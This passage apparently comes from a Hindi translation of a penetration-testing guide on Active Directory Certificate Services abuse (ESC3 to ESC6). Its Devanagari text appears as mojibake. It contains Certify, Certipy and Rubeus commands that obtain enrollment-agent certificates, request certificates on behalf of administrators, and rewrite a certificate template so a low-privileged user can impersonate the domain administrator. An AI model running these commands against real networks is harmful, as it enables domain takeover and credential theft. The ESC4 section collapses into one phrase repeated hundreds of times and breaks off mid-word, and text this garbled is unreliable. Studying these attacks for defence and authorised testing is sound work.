рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИред

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ 1:**

1. рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CA рдХрдо-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИред
2. рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдЕрдХреНрд╖рдо рд╣реИред
3. рдХреЛрдИ рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред
4. рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдгрдХрд╛рд░рдХ рдХрдо-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИред
5. **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдиреБрд░реЛрдз рдПрдЬреЗрдВрдЯ EKU** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдиреБрд░реЛрдз рдПрдЬреЗрдВрдЯ OID (1.3.6.1.4.1.311.20.2.1) рдЕрдиреНрдп рдкреНрд░рдзрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ 2:**

1. рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CA рдХрдо-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИред
2. рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдЕрдХреНрд╖рдо рд╣реИред
3. **рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реНрдХреАрдорд╛ рд╕рдВрд╕реНрдХрд░рдг 1 рд╣реИ рдпрд╛ 2 рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ рдФрд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдиреБрд░реЛрдз рдПрдЬреЗрдВрдЯ EKU рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд░рдЦрддрд╛ рд╣реИред**
4. рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдПрдХ EKU рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
5. рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдкреНрд░рддрд┐рдмрдВрдз CA рдкрд░ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**Certify**](https://github.com/GhostPack/Certify) рдпрд╛ [**Certipy**](https://github.com/ly4k/Certipy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CAs рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рд╕реАрдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдПрдХ **рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрди **рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдПрдирд░реЛрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдЬрд┐рди **рдЦрд╛рддреЛрдВ** рдкрд░ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП `certsrc.msc` `рд╕реНрдиреИрдк-рдЗрди рдЦреЛрд▓реЗрдВ -> CA рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> "рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕" рдЯреИрдм рдореЗрдВ рдЬрд╛рдПрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** CA рд╕реЗрдЯрд┐рдВрдЧ "рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреА рд╕реАрдорд╛ рди рдХрд░реЗрдВ" рд╣реИред рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЬрдм рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ "рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреА рд╕реАрдорд╛ рд▓рдЧрд╛рдПрдВ" рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ рдмрд╣реБрдд рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг рд╣реЛрддреА рд╣реИ, рдЬреЛ рд╣рд░ рдХрд┐рд╕реА рдХреЛ рд╕рднреА рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рджреЗрддреА рд╣реИред

## рд╡рдВрд╢реАрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдХрдордЬреЛрд░реА - ESC4

### **рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг**

**рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ** рдореЗрдВ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ AD **рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕** рдХреЗ рдкрд╛рд╕ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд╡рд┐рд╢реЗрд╖ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ**ред

рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдкрд░реНрдпрд╛рдкреНрдд **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрддреА рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХреЗ рдФрд░ **рдкрд┐рдЫрд▓реЗ рдЦрдВрдбреЛрдВ** рд╕реЗ рдХрд┐рд╕реА рднреА рдЙрддреНрдкрд╛рджрдиреАрдп **рдЧрд▓рддрд┐рдпреЛрдВ** рдХреЛ рдмрдирд╛ рд╕рдХреЗ, рддреЛ рдЙрд╕реЗ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдФрд░ **рд╡рдВрд╢реАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░** рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯреЛрдВ рдкрд░ рджрд┐рд▓рдЪрд╕реНрдк рдЕрдзрд┐рдХрд╛рд░:

* **рд╕реНрд╡рд╛рдореА:** рд╡рд╕реНрддреБ рдХрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг, рдХрд┐рд╕реА рднреА рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг:** рд╡рд╕реНрддреБ рдХрд╛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг, рдХрд┐рд╕реА рднреА рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рд▓реЗрдЦрдХ рд▓рд┐рдЦреЗрдВ:** рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреНрд░рдореБрдЦрд▓рдмреНрдз рдХреЗ рд▓рд┐рдП рдорд╛рд▓рд┐рдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **Dacl рд▓рд┐рдЦреЗрдВ:** рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рд╕рдВрдкрддреНрддрд┐ рд▓рд┐рдЦреЗрдВ:** рдХрд┐рд╕реА рднреА рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ

### рджреБрд░реБрдкрдпреЛрдЧ

рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рдПрдХ рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ рдЙрджрд╛рд╣рд░рдг:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдкреАрдХреЗрдЖрдИ рдСрдмреНрдЬреЗрдХреНрдЯ рдНрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ - ESC5

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдПрдбреА рд╕реАрдПрд╕ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рд╡рд╛рд▓реЗ рдХрдИ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдФрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдмрд╛рд╣рд░ рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдмреАрдЪ рдЬреБрдбрд╝реЗ рд╣реБрдП рдПрд╕реАрдПрд▓ рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдЬрд╛рд▓ рд╡реНрдпрд╛рдкрдХ рд╣реИред рдпреЗ рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ (рд▓реЗрдХрд┐рди рдЗрдирд╕реЗ рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реИрдВ):

* рд╕реАрдП рд╕рд░реНрд╡рд░ рдХрд╛ рдПрдбреА рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ (рдпрд╛рдиреА, S4U2Self рдпрд╛ S4U2Proxy рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдХрдЯ)
* рд╕реАрдП рд╕рд░реНрд╡рд░ рдХрд╛ рдЖрд░рдкреАрд╕реА / рдбреАрдХреЙрдо рд╕рд░реНрд╡рд░
* рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╡рдВрд╢рдЬ рдПрдбреА рдСрдмреНрдЬреЗрдХреНрдЯ рдпрд╛ рдХрдВрдЯреЗрдирд░ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрдВрдЯреЗрдирд░, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХрдВрдЯреЗрдирд░, NTAuthCertificates рдСрдмреНрдЬреЗрдХреНрдЯ, рдирд╛рдорд╛рдВрдХрди рд╕реЗрд╡рд╛ рдХрдВрдЯреЗрдирд░, рдЖрджрд┐)

рдпрджрд┐ рдХрд┐рд╕реА рдХрдо рдЕрдзрд┐рдХрд╛рд░реА рджреНрд╡рд╛рд░рд╛ рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЛ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкреАрдХреЗрдЖрдИ рдкреНрд░рдгрд╛рд▓реА рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдПрдХ рдФрд░ рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдЬрд┐рд╕реЗ [**CQure Academy рдкреЛрд╕реНрдЯ**](https://cqureacademy.com/blog/enhanced-key-usage) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** рдлрд╝реНрд▓реИрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИред рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░, "рдпрджрд┐" рдЗрд╕ рдлрд╝реНрд▓реИрдЧ рдХреЛ рд╕реАрдП рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, "рдХрд┐рд╕реА рднреА рдЕрдиреБрд░реЛрдз (рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрдорд╛рдг рд╕реЗ рд╡рд┐рд╖рдп рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ) рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдорд╛рди рд╡рд┐рд╖рдп рд╡реИрдХрд▓реНрдкрд┐рдХ рдирд╛рдо рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ 